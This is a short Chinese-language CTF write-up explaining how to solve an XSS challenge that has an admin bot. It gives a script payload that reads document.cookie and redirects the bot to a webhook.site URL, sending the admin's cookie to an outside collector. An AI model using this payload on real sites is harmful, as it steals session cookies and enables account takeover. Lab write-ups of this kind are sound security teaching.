浏览器有一个规则：**同一个域名下的JavaScript可以读取该域名的cookie**
对于本题，我们可以直接用js的 `document.cookie` 来获取cookie

首先本题目本身就是一个 `admin bot` ，当你点击生成链接后，admin bot会直接启动，去访问你的链接。这时候我们在利用 `document.cookie` 把 `cookie` 读出来，然后把它拼接到一个http请求上。
这个请求可以是你的自建服务器，也可以是其他的 `请求接收平台` ，反正只要能看到网络请求就行。

这里我使用了 `webhook.site` ，进入网站后它会生成一个url, 那个url包含了 `webhook` 的域名和你当前的 `请求接收实例` 资源的位置。

这里我们构造如下payload：
```
<script>document.location='https://webhook.site/你的ID/?c='+document.cookie</script>
```
这里随便设置一个请求参数，防止后面的cookie值直接拼接到路径。（不过其实不设置也可以啦，不设置的话cookie值会直接变成参数名）

我们把payload提交到题目中的输入栏后， `admin bot` 直接就开始访问你的链接了，这时候就能在http接收平台看到 `admin bot` 发来的请求了。